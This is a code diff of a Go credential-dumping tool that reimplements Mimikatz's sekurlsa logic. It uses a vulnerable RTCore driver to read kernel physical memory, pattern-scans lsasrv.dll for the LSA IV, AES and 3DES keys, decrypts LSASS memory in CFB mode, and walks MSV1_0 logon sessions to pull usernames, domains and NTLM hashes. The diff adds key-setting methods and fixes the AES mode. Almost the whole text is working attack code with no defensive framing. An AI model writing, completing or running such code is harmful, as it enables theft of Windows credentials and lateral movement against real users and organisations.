@@ -14,17 +14,17 @@ import (
 
 // LsaMemoryDecryptor handles LSA memory decryption (the MISSING piece!)
 type LsaMemoryDecryptor struct {
-	rtcore  *byovd.RTCoreExploit
-	logger  *logger.Logger
-	
+	rtcore *byovd.RTCoreExploit
+	logger *logger.Logger
+
 	// Critical decryption keys from LSASS memory
-	initVector      [16]byte
-	aesKey          [16]byte
-	des3Key         [24]byte
-	hasDecryptKeys  bool
+	initVector     [16]byte
+	aesKey         []byte
+	des3Key        []byte
+	hasDecryptKeys bool
 }
 
-// NewLsaMemoryDecryptor creates the decryptor that mimikatz uses
+// NewLsaMemoryDecryptor creates the decryptor
 func NewLsaMemoryDecryptor(rtcore *byovd.RTCoreExploit, logger *logger.Logger) *LsaMemoryDecryptor {
 	return &LsaMemoryDecryptor{
 		rtcore: rtcore,
@@ -32,23 +32,42 @@ func NewLsaMemoryDecryptor(rtcore *byovd.RTCoreExploit, logger *logger.Logger) *
 	}
 }
 
+// SetKeys - Set decryption keys from kernel dumper
+func (lmd *LsaMemoryDecryptor) SetKeys(des3Key, aesKey []byte) {
+	if des3Key != nil {
+		lmd.des3Key = des3Key
+		lmd.logger.Infof("Set 3DES key (%d bytes)", len(des3Key))
+	}
+	if aesKey != nil {
+		lmd.aesKey = aesKey
+		lmd.logger.Infof("Set AES key (%d bytes)", len(aesKey))
+	}
+	lmd.hasDecryptKeys = (des3Key != nil || aesKey != nil)
+}
+
+// SetIV - Set InitializationVector from BCrypt extraction
+func (lmd *LsaMemoryDecryptor) SetIV(iv [16]byte) {
+	lmd.initVector = iv
+	lmd.logger.Infof("Set InitializationVector: %x...", iv[:4])
+}
+
 // InitializeDecryptionKeys - CRITICAL: LSA memory decryption implementation
 // Mimikatz finds these symbols in lsasrv.dll:
 // - InitializationVector (16 bytes)
-// - hAesKey (AES key handle -> actual key)  
+// - hAesKey (AES key handle -> actual key)
 // - h3DesKey (3DES key handle -> actual key)
 func (lmd *LsaMemoryDecryptor) InitializeDecryptionKeys(lsasrvBase uint64, lsasrvSize uint32) error {
 	lmd.logger.Info("CRITICAL: Finding LSA decryption keys (missing piece!)")
-	
+
 	// Read lsasrv.dll memory
 	lsasrvData, err := lmd.rtcore.ReadPhysicalMemory(lsasrvBase, lsasrvSize)
 	if err != nil {
 		return fmt.Errorf("failed to read lsasrv.dll: %v", err)
 	}
-	
+
 	// Pattern for InitializationVector (constant across Windows versions)
 	initVectorPattern := []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x0D}
-	
+
 	// Find InitializationVector
 	if ivAddr := lmd.searchPatternInMemory(lsasrvData, initVectorPattern, lsasrvBase); ivAddr != 0 {
 		// Read the initialization vector
@@ -60,10 +79,10 @@ func (lmd *LsaMemoryDecryptor) InitializeDecryptionKeys(lsasrvBase uint64, lsasr
 			lmd.logger.Infof("Found InitializationVector at 0x%X", ivAddr)
 		}
 	}
-	
+
 	// Pattern for AES key location (this changes by Windows version)
 	aesKeyPattern := []byte{0x48, 0x8D, 0x0D} // LEA RCX, [rip+...]
-	
+
 	// Find AES key
 	if aesAddr := lmd.searchPatternInMemory(lsasrvData, aesKeyPattern, lsasrvBase); aesAddr != 0 {
 		// AES key is typically stored as key handle, need to resolve it
@@ -75,11 +94,11 @@ func (lmd *LsaMemoryDecryptor) InitializeDecryptionKeys(lsasrvBase uint64, lsasr
 			lmd.logger.Infof("Found AES key material at 0x%X", aesAddr)
 		}
 	}
-	
+
 	// Pattern for 3DES key
 	des3KeyPattern := []byte{0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x0D}
-	
-	// Find 3DES key  
+
+	// Find 3DES key
 	if des3Addr := lmd.searchPatternInMemory(lsasrvData, des3KeyPattern, lsasrvBase); des3Addr != 0 {
 		keyData, err := lmd.rtcore.ReadPhysicalMemory(des3Addr, 24)
 		if err == nil && len(keyData) >= 24 {
@@ -87,7 +106,7 @@ func (lmd *LsaMemoryDecryptor) InitializeDecryptionKeys(lsasrvBase uint64, lsasr
 			lmd.logger.Infof("Found 3DES key at 0x%X", des3Addr)
 		}
 	}
-	
+
 	lmd.hasDecryptKeys = true
 	lmd.logger.Info("LSA decryption keys initialized!")
 	return nil
@@ -99,62 +118,73 @@ func (lmd *LsaMemoryDecryptor) LsaUnprotectMemory(encryptedData []byte) ([]byte,
 	if !lmd.hasDecryptKeys {
 		return encryptedData, fmt.Errorf("decryption keys not initialized")
 	}
-	
+
 	if len(encryptedData) < 16 {
 		return encryptedData, nil // Too small to be encrypted
 	}
-	
+
 	lmd.logger.Debugf("Decrypting %d bytes of LSA memory", len(encryptedData))
-	
+
 	// Try AES decryption first (modern Windows)
 	if decrypted, err := lmd.decryptAES(encryptedData); err == nil {
 		lmd.logger.Debug("AES decryption successful")
 		return decrypted, nil
 	}
-	
+
 	// Fallback to 3DES (older Windows)
 	if decrypted, err := lmd.decrypt3DES(encryptedData); err == nil {
 		lmd.logger.Debug("3DES decryption successful")
 		return decrypted, nil
 	}
-	
+
 	lmd.logger.Debug("Decryption failed, returning original data")
 	return encryptedData, nil
 }
 
 // Internal decryption methods
 func (lmd *LsaMemoryDecryptor) decryptAES(data []byte) ([]byte, error) {
-	if len(data)%16 != 0 {
+	if len(lmd.aesKey) == 0 {
+		return nil, fmt.Errorf("AES key not available")
+	}
+
+	// Mimikatz uses CFB mode, NOT CBC!
+	// kuhl_m_sekurlsa_nt6.c: BCryptSetProperty(..., BCRYPT_CHAIN_MODE_CFB, ...)
+	if len(data)%aes.BlockSize != 0 {
 		return nil, fmt.Errorf("invalid AES block size")
 	}
-	
-	block, err := aes.NewCipher(lmd.aesKey[:])
+
+	block, err := aes.NewCipher(lmd.aesKey)
 	if err != nil {
 		return nil, err
 	}
-	
-	mode := cipher.NewCBCDecrypter(block, lmd.initVector[:])
+
+	// CFB mode (Cipher Feedback) - EXACTLY like Mimikatz
+	mode := cipher.NewCFBDecrypter(block, lmd.initVector[:])
 	decrypted := make([]byte, len(data))
-	mode.CryptBlocks(decrypted, data)
-	
+	mode.XORKeyStream(decrypted, data)
+
 	return decrypted, nil
 }
 
 func (lmd *LsaMemoryDecryptor) decrypt3DES(data []byte) ([]byte, error) {
+	if len(lmd.des3Key) == 0 {
+		return nil, fmt.Errorf("3DES key not available")
+	}
+
 	if len(data)%8 != 0 {
 		return nil, fmt.Errorf("invalid 3DES block size")
 	}
-	
-	block, err := des.NewTripleDESCipher(lmd.des3Key[:])
+
+	block, err := des.NewTripleDESCipher(lmd.des3Key)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	iv := lmd.initVector[:8] // Use first 8 bytes as IV
 	mode := cipher.NewCBCDecrypter(block, iv)
 	decrypted := make([]byte, len(data))
 	mode.CryptBlocks(decrypted, data)
-	
+
 	return decrypted, nil
 }
 
@@ -193,22 +223,22 @@ func NewCredentialExtractor(rtcore *byovd.RTCoreExploit, logger *logger.Logger, 
 // ExtractMSV1Credentials extracts NTLM hashes (like mimikatz msv)
 func (ce *CredentialExtractor) ExtractMSV1Credentials(sessionPtr uint64) ([]Credential, error) {
 	var creds []Credential
-	
+
 	// Read the logon session entry
 	sessionData, err := ce.rtcore.ReadPhysicalMemory(sessionPtr, 1024) // Read more data
 	if err != nil {
 		return nil, err
 	}
-	
+
 	// Parse as KIWI_MSV1_0_LIST_63 structure
 	var session KIWI_MSV1_0_LIST_63
 	if len(sessionData) >= int(unsafe.Sizeof(session)) {
 		session = *(*KIWI_MSV1_0_LIST_63)(unsafe.Pointer(&sessionData[0]))
-		
+
 		// Extract username/domain
 		username, _ := ce.readUnicodeString(&session.UserName)
 		domain, _ := ce.readUnicodeString(&session.Domain)
-		
+
 		if username != "" && username != "$" {
 			// Walk credentials chain
 			credPtr := session.Credentials
@@ -217,10 +247,9 @@ func (ce *CredentialExtractor) ExtractMSV1Credentials(sessionPtr uint64) ([]Cred
 				if err != nil {
 					break
 				}
-				
-				var msvCred KIWI_MSV1_0_CREDENTIALS
-				msvCred = *(*KIWI_MSV1_0_CREDENTIALS)(unsafe.Pointer(&credData[0]))
-				
+
+				msvCred := *(*KIWI_MSV1_0_CREDENTIALS)(unsafe.Pointer(&credData[0]))
+
 				// Extract primary credentials
 				if msvCred.PrimaryCredentials != 0 {
 					primaryData, err := ce.rtcore.ReadPhysicalMemory(msvCred.PrimaryCredentials, 256)
@@ -242,12 +271,12 @@ func (ce *CredentialExtractor) ExtractMSV1Credentials(sessionPtr uint64) ([]Cred
 						}
 					}
 				}
-				
+
 				credPtr = msvCred.Next
 			}
 		}
 	}
-	
+
 	return creds, nil
 }
 
@@ -269,7 +298,7 @@ func (ce *CredentialExtractor) isValidNTLMHash(hash []byte) bool {
 	if len(hash) != 16 {
 		return false
 	}
-	
+
 	// Check for all zeros
 	allZeros := true
 	for _, b := range hash {
@@ -278,7 +307,7 @@ func (ce *CredentialExtractor) isValidNTLMHash(hash []byte) bool {
 			break
 		}
 	}
-	
+
 	// Check for all 0xFF
 	allFFs := true
 	for _, b := range hash {
@@ -287,7 +316,7 @@ func (ce *CredentialExtractor) isValidNTLMHash(hash []byte) bool {
 			break
 		}
 	}
-	
+
 	return !allZeros && !allFFs
 }
 
@@ -303,7 +332,7 @@ func (ce *CredentialExtractor) readUnicodeString(us *UNICODE_STRING) (string, er
 
 	// Decrypt if needed
 	decryptedData, _ := ce.decryptor.LsaUnprotectMemory(data)
-	
+
 	// Convert UTF-16LE to string
 	if len(decryptedData)%2 != 0 {
 		return "", fmt.Errorf("invalid unicode string length")
@@ -321,6 +350,6 @@ func (ce *CredentialExtractor) readUnicodeString(us *UNICODE_STRING) (string, er
 		}
 		result += string(rune(r))
 	}
-	
+
 	return result, nil
 }
